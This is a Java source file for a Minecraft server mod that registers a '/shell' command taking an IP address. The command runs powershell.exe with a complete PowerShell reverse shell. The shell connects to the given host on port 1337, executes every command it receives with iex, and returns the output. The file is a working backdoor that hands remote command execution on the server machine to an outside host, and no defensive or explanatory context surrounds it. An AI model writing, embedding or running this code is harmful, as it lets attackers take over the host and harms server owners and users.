package com.shell;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;

public class ShellCommand {

    public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
        dispatcher.register(Commands.literal("shell")
                .requires(source -> source.hasPermission(2))
                .then(Commands.argument("ip", StringArgumentType.string())
                        .executes(context -> {
                            String ip = StringArgumentType.getString(context, "ip");

                            try {
                                String psCommand = "$client = New-Object System.Net.Sockets.TCPClient('" + ip + "',1337);" +
                                        "$stream = $client.GetStream();" +
                                        "[byte[]]$bytes = 0..65535|%{0};" +
                                        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" +
                                        "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
                                        "$sendback = (iex $data 2>&1 | Out-String );" +
                                        "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
                                        "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
                                        "$stream.Write($sendbyte,0,$sendbyte.Length);" +
                                        "$stream.Flush()};" +
                                        "$client.Close()";

                                String[] cmd = new String[]{"powershell.exe", "-Command", psCommand};
                                Runtime.getRuntime().exec(cmd);

                                context.getSource().sendSuccess(() -> Component.literal("Shell started to: " + ip), false);
                                return 1;
                            } catch (Exception e) {
                                context.getSource().sendFailure(Component.literal("Error: " + e.getMessage()));
                                return 0;
                            }
                        })
                )
        );
    }
}